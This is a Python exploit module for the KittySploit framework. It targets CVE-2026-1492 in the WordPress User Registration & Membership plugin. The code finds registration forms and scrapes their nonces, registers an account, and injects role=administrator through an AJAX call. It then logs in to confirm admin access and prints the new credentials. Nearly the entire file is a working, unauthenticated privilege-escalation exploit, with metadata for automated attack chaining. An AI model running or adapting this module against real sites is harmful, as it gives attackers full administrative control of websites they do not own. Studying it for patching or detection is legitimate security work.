#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import datetime
import json
import random
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, urljoin, urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress User Registration Membership CVE-2026-1492 admin escalation",
        "description": (
            "CVE-2026-1492: User Registration & Membership <= 5.1.2 accepts a client-supplied "
            "role in user_registration_membership_register_member without a server-side "
            "allowlist. This module discovers membership registration forms, registers a user, "
            "then injects role=administrator via AJAX to create a privileged WordPress account."
        ),
        "author": ["Nxploited", "KittySploit Team"],
        "cve": ["CVE-2026-1492"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-1492",
            "https://www.cve.org/CVERecord?id=CVE-2026-1492",
            "https://github.com/Nxploited/CVE-2026-1492",
            "https://wordpress.org/plugins/user-registration/",
        ],
        "tags": [
            "wordpress",
            "user-registration",
            "membership",
            "privilege-escalation",
            "unauthenticated",
            "cwe-269",
            "cve-2026-1492",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "account_creation"],
            "expected_requests": 12,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 1.5,
            "noise": 0.6,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["wordpress", "user-registration"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/wp-admin/admin-ajax.php", "/membership"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": ""},
                    {"capability": "admin_access", "from_detail": "wordpress"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    _PLUGIN_SLUG = "user-registration"
    _MAX_AFFECTED = (5, 1, 2)
    _DEFAULT_PATHS = (
        "/membership-pricing/",
        "/registration/",
        "/registration-form/",
        "/membership-registration/",
        "/reg/",
    )

    path = OptString("/", "WordPress base path", required=False)
    username_prefix = OptString("ks_admin", "Username prefix for created accounts", required=False)
    password = OptString("Kx_Pwned_1492!", "Password for the created administrator", required=False)
    email = OptString("", "Email (auto-generated when empty)", required=False)
    role = OptString("administrator", "Role injected into members_data", required=False)
    membership_id = OptString("", "Force membership ID (auto-discover when empty)", required=False)
    registration_path = OptString(
        "",
        "Force registration page path (auto-discover when empty)",
        required=False,
    )

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _base(self) -> str:
        return self.wp_normalize_base_path(self._opt(self.path) or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        if root == "/":
            return suffix
        return root.rstrip("/") + suffix

    def _origin(self) -> str:
        host = self._opt(self.target)
        port = int(self.port or 80)
        use_ssl = bool(self.ssl) if hasattr(self, "ssl") else port in (443, 8443)
        scheme = "https" if use_ssl else "http"
        if (use_ssl and port == 443) or (not use_ssl and port == 80):
            return f"{scheme}://{host}"
        return f"{scheme}://{host}:{port}"

    def _abs(self, path: str) -> str:
        return urljoin(self._origin() + "/", path.lstrip("/"))

    def _get(self, path: str) -> Optional[object]:
        return self.http_request(
            method="GET",
            path=path,
            allow_redirects=True,
            timeout=max(int(self.timeout or 15), 10),
        )

    def _post_ajax(self, ajax_path: str, body: str, referer: str) -> Tuple[Dict[str, Any], Optional[object]]:
        response = self.http_request(
            method="POST",
            path=ajax_path,
            data=body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": self._origin(),
                "Referer": referer or self._origin(),
            },
            allow_redirects=True,
            timeout=max(int(self.timeout or 20), 15),
        )
        if not response:
            return {}, None
        try:
            return response.json(), response
        except Exception:
            try:
                return json.loads(response.text or ""), response
            except Exception:
                return {"raw": response.text or ""}, response

    @staticmethod
    def _parse_js_object(blob: str) -> Dict[str, Any]:
        cleaned = (blob or "").strip().rstrip(";")
        cleaned = cleaned.replace(r"\/", "/")
        cleaned = re.sub(r",(\s*[}\]])", r"\1", cleaned)
        try:
            data = json.loads(cleaned)
            return data if isinstance(data, dict) else {}
        except Exception:
            flat: Dict[str, Any] = {}
            for key, val in re.findall(r'"([^"]+)"\s*:\s*"([^"]*)"', cleaned or ""):
                flat[key] = val
            return flat

    def _discover_pages(self) -> Dict[str, str]:
        pages: Dict[str, str] = {}
        forced = self._opt(self.registration_path)
        candidates = [forced] if forced else list(self._DEFAULT_PATHS)

        for slug in candidates:
            path = self._join(slug)
            response = self._get(path)
            if response and response.status_code == 200 and response.text:
                pages[path] = response.text

        pricing = self._join("/membership-pricing/")
        pricing_html = pages.get(pricing)
        if pricing_html:
            for href in re.findall(
                r'href=["\']([^"\']*membership[^"\']*id=[0-9]{1,10}[^"\']*)["\']',
                pricing_html,
                re.I,
            ):
                full = href
                if href.startswith("/"):
                    full = self._join(href)
                elif not href.startswith("http"):
                    full = urljoin(self._abs(pricing), href)
                path = urlparse(full).path or full
                if path not in pages:
                    response = self._get(path)
                    if response and response.status_code == 200 and response.text:
                        pages[path] = response.text
        return pages

    @staticmethod
    def _extract_plans(pricing_html: str) -> List[Optional[str]]:
        plans: List[Optional[str]] = []
        for mid in re.findall(r"membership[^=]*id=([0-9]{1,10})", pricing_html or "", re.I):
            if mid not in plans:
                plans.append(mid)
        for tag in re.findall(
            r'<input[^>]*class=["\'][^"\']*ur_membership_input_class[^"\']*["\'][^>]*>',
            pricing_html or "",
            re.I,
        ):
            match = re.search(r'value=["\']([0-9]{1,10})["\']', tag, re.I)
            if match and match.group(1) not in plans:
                plans.append(match.group(1))
        return plans or [None]

    @staticmethod
    def _extract_membership(reg_html: str, hint: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
        membership_id = None
        field_name = None
        match = re.search(
            r'<input[^>]*class=["\'][^"\']*ur_membership_input_class[^"\']*ur_membership_radio_input[^"\']*["\'][^>]*>',
            reg_html or "",
            re.I,
        )
        if match:
            tag = match.group(0)
            mv = re.search(r'value=["\']([0-9]{1,10})["\']', tag, re.I)
            if mv:
                membership_id = mv.group(1)
            mn = re.search(r'data-name=["\']([^"\']+)["\']', tag, re.I)
            if mn:
                field_name = mn.group(1)
        if not membership_id:
            m2 = re.search(r"membership[^=]*id=([0-9]{1,10})", reg_html or "", re.I)
            if m2:
                membership_id = m2.group(1)
        return membership_id or hint, field_name

    @staticmethod
    def _extract_ur_nonce(reg_html: str) -> Optional[str]:
        match = re.search(
            r'<input[^>]+name=["\']ur_frontend_form_nonce["\'][^>]*value=["\']([^"\']+)["\']',
            reg_html or "",
            re.I,
        )
        if match:
            return match.group(1)
        match = re.search(
            r'ur_frontend_form_nonce["\']\s*[:=]\s*["\']([^"\']+)["\']',
            reg_html or "",
            re.I,
        )
        return match.group(1) if match else None

    def _extract_ur_params(self, reg_html: str) -> Dict[str, str]:
        match = re.search(
            r"(?:var|let|const)\s+user_registration_params\s*=\s*(\{.*?\})\s*;",
            reg_html or "",
            re.S | re.I,
        )
        data = self._parse_js_object(match.group(1)) if match else {}
        keys: Dict[str, str] = {}
        for key, value in data.items():
            if isinstance(value, (str, int, float, bool)):
                keys[str(key)] = str(value)
        return keys

    @staticmethod
    def _pick_security(keys: Dict[str, str]) -> Optional[str]:
        def ok(val: str) -> bool:
            return bool(val) and len(val) >= 8 and re.fullmatch(r"[0-9a-zA-Z]+", val)

        for key, value in keys.items():
            if key.lower() == "user_registration_form_data_save" and ok(value):
                return value
        for key, value in keys.items():
            low = key.lower()
            if "user_registration" in low and "form" in low and "save" in low and ok(value):
                return value
        for key, value in keys.items():
            low = key.lower()
            if "user" in low and "registration" in low and ("submit" in low or "save" in low):
                if ok(value) and not any(b in low for b in ("upload", "remove", "profile", "picture")):
                    return value
        return None

    def _extract_membership_nonce(self, reg_html: str) -> Tuple[Optional[str], str]:
        ajax = self._join("/wp-admin/admin-ajax.php")
        for pattern in (
            r"(?:var|let|const|\s)ur_membership_frontend_localized_data\s*=\s*(\{.*?\})\s*;",
            r"ur_membership_frontend_localized_data\s*=\s*(\{.*?\})",
        ):
            match = re.search(pattern, reg_html or "", re.S | re.I)
            if not match:
                continue
            data = self._parse_js_object(match.group(1))
            nonce = data.get("_nonce") or data.get("nonce")
            if isinstance(nonce, str) and len(nonce) >= 4:
                ajax_url = data.get("ajax_url") or data.get("url")
                if isinstance(ajax_url, str) and ajax_url.startswith("http"):
                    ajax = urlparse(ajax_url).path or ajax
                return nonce, ajax
        return None, ajax

    @staticmethod
    def _extract_form_id(reg_html: str) -> str:
        for pattern in (
            r'<input[^>]+name=["\']ur-user-form-id["\'][^>]*value=["\']([0-9]{1,10})["\']',
            r'<input[^>]+name=["\']form_id["\'][^>]*value=["\']([0-9]{1,10})["\']',
            r"user-registration-form-([0-9]{1,10})",
        ):
            match = re.search(pattern, reg_html or "", re.I)
            if match:
                return match.group(1)
        return "1"

    @staticmethod
    def _extract_fields(reg_html: str) -> List[Dict[str, Any]]:
        fields: List[Dict[str, Any]] = []
        for block in re.findall(
            r'<div[^>]+class=["\'][^"\']*ur-field-item[^"\']*["\'][^>]*>(.*?)</div>\s*</div>',
            reg_html or "",
            re.S | re.I,
        ):
            label = ""
            lm = re.search(r"<label[^>]*>(.*?)</label>", block, re.S | re.I)
            if lm:
                label = re.sub(r"\s+", " ", re.sub(r"<.*?>", "", lm.group(1))).strip()
            required = "required" in block or "validate-required" in block
            name = None
            ftype = "text"
            options: List[str] = []
            im = re.search(r'<input[^>]+name=["\']([^"\']+)["\']', block, re.I)
            if im:
                name = im.group(1)
                tm = re.search(
                    rf'<input[^>]+name=["\']{re.escape(name)}["\'][^>]*type=["\']([^"\']+)["\']',
                    block,
                    re.I,
                )
                if tm:
                    ftype = tm.group(1).lower()
            else:
                sm = re.search(r'<select[^>]+name=["\']([^"\']+)["\']', block, re.I)
                if sm:
                    name = sm.group(1)
                    ftype = "select"
                    for opt in re.findall(r"<option[^>]*>(.*?)</option>", block, re.S | re.I):
                        txt = re.sub(r"\s+", " ", re.sub(r"<.*?>", "", opt)).strip()
                        if txt:
                            options.append(txt)
                else:
                    tm2 = re.search(r'<textarea[^>]+name=["\']([^"\']+)["\']', block, re.I)
                    if tm2:
                        name = tm2.group(1)
                        ftype = "textarea"
            if not name:
                continue
            fields.append(
                {
                    "name": name,
                    "type": ftype,
                    "label": label or name,
                    "required": required,
                    "options": options,
                }
            )
        return fields

    def _build_form_data(
        self,
        username: str,
        email: str,
        password: str,
        membership_field: Optional[str],
        membership_id: Optional[str],
        fields: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        form_data: List[Dict[str, Any]] = []

        def add(name: str, value: str, ftype: str, label: str):
            form_data.append(
                {
                    "field_name": name.replace("[]", ""),
                    "value": value,
                    "field_type": ftype,
                    "label": label,
                }
            )

        for field in fields:
            name = field["name"]
            ftype = field["type"]
            label = field["label"]
            low = name.lower()
            if low in ("user_login", "username", "login"):
                add(name, username, ftype, label)
                continue
            if low in ("user_email", "email", "user_email_address", "billing_email"):
                add(name, email, ftype, label)
                continue
            if "confirm" in low and "email" in low:
                add(name, email, ftype, label)
                continue
            if low in ("user_pass", "password"):
                add(name, password, ftype, label)
                continue
            if low in ("user_confirm_password", "confirm_password", "confirm_pass"):
                add(name, password, ftype, label)
                continue
            if membership_field and name == "urm_membership" and membership_id:
                add(membership_field, membership_id, "radio", "membership")
                continue
            if not field["required"]:
                continue
            if ftype in ("tel", "phone") or "phone" in low or "mobile" in low:
                value = "00966555555555"
            elif "zip" in low or "postal" in low or "postcode" in low:
                value = "12345"
            elif "country" in low:
                opts = field.get("options") or []
                value = next((o for o in opts if "united states" in o.lower() or "saudi" in o.lower()), None)
                value = value or (opts[0] if opts else "United States")
            elif "city" in low:
                value = "Riyadh"
            elif any(k in low for k in ("website", "url", "site_url", "siteurl")):
                value = "https://example.com"
            elif "first_name" in low or "fname" in low:
                value = "Test"
            elif "last_name" in low or "lname" in low:
                value = "User"
            elif ftype in ("number", "range"):
                value = "123"
            elif ftype == "email":
                value = email
            elif ftype in ("radio", "checkbox", "select"):
                value = (field.get("options") or ["on"])[0]
            else:
                value = "Test"
            add(name, value, ftype, label)

        existing = {item["field_name"] for item in form_data}
        for name, value, ftype, label in (
            ("user_login", username, "text", "Username"),
            ("user_email", email, "email", "User Email"),
            ("user_pass", password, "password", "User Password"),
            ("user_confirm_password", password, "password", "Confirm Password"),
        ):
            if name not in existing:
                add(name, value, ftype, label)
        if membership_id and membership_field and membership_field not in existing:
            add(membership_field, membership_id, "radio", "membership")
        return form_data

    def _register_user(
        self,
        username: str,
        email: str,
        password: str,
        form_id: str,
        ur_nonce: str,
        security: str,
        ajax_path: str,
        membership_field: Optional[str],
        membership_id: Optional[str],
        referer: str,
        fields: List[Dict[str, Any]],
    ) -> Tuple[bool, Dict[str, Any]]:
        form_data = self._build_form_data(
            username, email, password, membership_field, membership_id, fields
        )
        form_json = quote(json.dumps(form_data, separators=(",", ":")), safe="")
        parts = [
            "action=user_registration_user_form_submit",
            f"form_data={form_json}",
            f"form_id={quote(str(form_id), safe='')}",
            "registration_language=en-US",
            f"ur_frontend_form_nonce={quote(ur_nonce, safe='')}",
            f"security={quote(security, safe='')}",
        ]
        if membership_id:
            parts.append(f"is_membership_active={quote(str(membership_id), safe='')}")
            parts.append(f"membership_type={quote(str(membership_id), safe='')}")
        payload, _ = self._post_ajax(ajax_path, "&".join(parts), self._abs(referer))
        return bool(payload.get("success") is True), payload

    def _register_member(
        self,
        username: str,
        membership_id: str,
        membership_nonce: str,
        ajax_path: str,
        referer: str,
        reg_data: Optional[Dict[str, Any]],
    ) -> Tuple[bool, Dict[str, Any]]:
        today = datetime.date.today()
        members = {
            "membership": membership_id,
            "payment_method": "free",
            "start_date": f"{today.year}-{today.month}-{today.day}",
            "username": username,
            "role": self._opt(self.role) or "administrator",
        }
        form_response = reg_data if isinstance(reg_data, dict) else {
            "username": username,
            "success_message_positon": "1",
            "form_login_option": "default",
            "redirect_timeout": 0,
            "registration_type": "membership",
        }
        nonce = quote(membership_nonce, safe="")
        body = (
            "action=user_registration_membership_register_member"
            f"&members_data={quote(json.dumps(members, separators=(',', ':')), safe='')}"
            f"&form_response={quote(json.dumps(form_response, separators=(',', ':')), safe='')}"
            f"&_wpnonce={nonce}&security={nonce}"
        )
        payload, _ = self._post_ajax(ajax_path, body, self._abs(referer))
        return bool(payload.get("success") is True), payload

    def _verify_admin(self, username: str, password: str) -> bool:
        login_paths = (
            self._join("/wp-login.php"),
            self._join("/login/"),
            self._join("/my-account/"),
        )
        for login_path in login_paths:
            self._get(login_path)
            response = self.http_request(
                method="POST",
                path=login_path,
                data={
                    "log": username,
                    "username": username,
                    "user_login": username,
                    "pwd": password,
                    "password": password,
                    "wp-submit": "Log In",
                    "testcookie": "1",
                },
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": self._abs(login_path),
                    "Cookie": "wordpress_test_cookie=WP Cookie check",
                },
                allow_redirects=True,
                timeout=max(int(self.timeout or 15), 10),
            )
            if not response:
                continue
            cookies = getattr(self.session, "cookies", None)
            logged_in = False
            if cookies is not None:
                logged_in = any(str(c.name).startswith("wordpress_logged_in") for c in cookies)
            if not logged_in and "wordpress_logged_in" not in (response.headers.get("Set-Cookie") or ""):
                continue

            for admin_path in (
                self._join("/wp-admin/"),
                self._join("/wp-admin/users.php"),
                self._join("/wp-admin/plugin-install.php"),
            ):
                admin = self._get(admin_path)
                if not admin or admin.status_code != 200:
                    continue
                low = (admin.text or "").lower()
                if any(
                    marker in low
                    for marker in (
                        "wp-admin-bar",
                        "adminmenu",
                        "users.php",
                        "plugins.php",
                        "plugin-install",
                        "upload-plugin",
                    )
                ):
                    return True
        return False

    def _attempt_on_page(
        self,
        reg_path: str,
        reg_html: str,
        membership_hint: Optional[str],
    ) -> Optional[Dict[str, str]]:
        membership_id, membership_field = self._extract_membership(
            reg_html, membership_hint or self._opt(self.membership_id) or None
        )
        ur_nonce = self._extract_ur_nonce(reg_html)
        ur_keys = self._extract_ur_params(reg_html)
        security = self._pick_security(ur_keys)
        ajax_url = ur_keys.get("ajax_url") or ur_keys.get("ajaxurl")
        ajax_path = urlparse(ajax_url).path if ajax_url and ajax_url.startswith("http") else self._join(
            "/wp-admin/admin-ajax.php"
        )
        membership_nonce, membership_ajax = self._extract_membership_nonce(reg_html)
        form_id = self._extract_form_id(reg_html)
        fields = self._extract_fields(reg_html)

        missing = []
        if not membership_id:
            missing.append("membership_id")
        if not ur_nonce:
            missing.append("ur_frontend_form_nonce")
        if not security:
            missing.append("registration security")
        if not membership_nonce:
            missing.append("membership nonce")
        if missing:
            print_warning(f"{reg_path}: missing {', '.join(missing)}")
            return None

        prefix = self._opt(self.username_prefix) or "ks_admin"
        password = self._opt(self.password) or "Kx_Pwned_1492!"
        username = f"{prefix}_{random.randint(100000, 999999)}"
        email = self._opt(self.email) or f"{username}@admin.local"

        print_status(f"Registering {username} via {reg_path} (membership {membership_id})")
        ok, reg_resp = self._register_user(
            username,
            email,
            password,
            form_id,
            ur_nonce,
            security,
            ajax_path,
            membership_field,
            membership_id,
            reg_path,
            fields,
        )
        if not ok:
            msg = ""
            if isinstance(reg_resp.get("data"), dict):
                msg = str(reg_resp["data"].get("message") or "")
            print_warning(f"Registration failed: {msg or reg_resp.get('raw') or 'unknown'}")
            return None

        login_option = (reg_resp.get("data") or {}).get("form_login_option") if isinstance(reg_resp.get("data"), dict) else None
        auto_login = bool((reg_resp.get("data") or {}).get("auto_login")) if isinstance(reg_resp.get("data"), dict) else False
        if login_option and login_option not in ("default", "auto_login") and not auto_login:
            print_warning(f"Account pending (login_option={login_option})")
            return None

        print_success("User registered; injecting administrator role via register_member")
        mem_ok, mem_resp = self._register_member(
            username,
            membership_id,
            membership_nonce,
            membership_ajax,
            reg_path,
            reg_resp.get("data") if isinstance(reg_resp.get("data"), dict) else None,
        )
        if not mem_ok:
            print_warning(f"register_member failed: {mem_resp.get('raw') or mem_resp}")
            # One override retry (PoC flow)
            mem_ok, mem_resp = self._register_member(
                username,
                membership_id,
                membership_nonce,
                membership_ajax,
                reg_path,
                reg_resp.get("data") if isinstance(reg_resp.get("data"), dict) else None,
            )
            if not mem_ok:
                return None

        print_status("Verifying administrator access...")
        if self._verify_admin(username, password):
            return {
                "username": username,
                "password": password,
                "email": email,
                "membership_id": membership_id,
                "path": reg_path,
            }
        print_warning("Membership succeeded but admin indicators not confirmed")
        return None

    def check(self):
        version = self.wp_plugin_version(self._PLUGIN_SLUG, self._base())
        if version:
            vulnerable = self.wp_version_to_tuple(version) <= self._MAX_AFFECTED
            return {
                "vulnerable": vulnerable,
                "reason": (
                    f"User Registration {version} is within CVE-2026-1492 range (<= 5.1.2)"
                    if vulnerable
                    else f"User Registration {version} appears patched (> 5.1.2)"
                ),
                "confidence": "high",
                "version": version,
            }

        pages = self._discover_pages()
        for html in pages.values():
            if "user-registration" in html or "ur_frontend_form_nonce" in html:
                return {
                    "vulnerable": True,
                    "reason": "User Registration membership forms detected (version unknown)",
                    "confidence": "medium",
                }
        return {
            "vulnerable": False,
            "reason": "User Registration plugin / membership forms not detected",
            "confidence": "low",
        }

    def run(self):
        print_status("CVE-2026-1492 — User Registration Membership admin escalation")
        check = self.check()
        print_info(check.get("reason", ""))
        if check.get("vulnerable") is False and check.get("confidence") == "high":
            print_error("Target appears patched")
            return False

        pages = self._discover_pages()
        if not pages:
            print_error("No registration/membership pages discovered")
            return False

        pricing = pages.get(self._join("/membership-pricing/"), "")
        plan_ids = self._extract_plans(pricing)
        forced_id = self._opt(self.membership_id)
        if forced_id:
            plan_ids = [forced_id]

        print_info(f"Discovered {len(pages)} page(s), {len(plan_ids)} membership plan hint(s)")

        for mid in plan_ids:
            for reg_path, reg_html in pages.items():
                if "user-registration" not in reg_html and "ur_frontend_form_nonce" not in reg_html:
                    continue
                creds = self._attempt_on_page(reg_path, reg_html, mid)
                if creds:
                    print_success("Administrator account created")
                    print_info(f"Login:     {self._abs(self._join('/wp-login.php'))}")
                    print_info(f"Username:  {creds['username']}")
                    print_info(f"Password:  {creds['password']}")
                    print_info(f"Email:     {creds['email']}")
                    print_info(f"Membership:{creds['membership_id']}")
                    return True

        print_error(
            "No administrator obtained (role may be overwritten server-side, "
            "or registration requires approval/email verification)"
        )
        return False
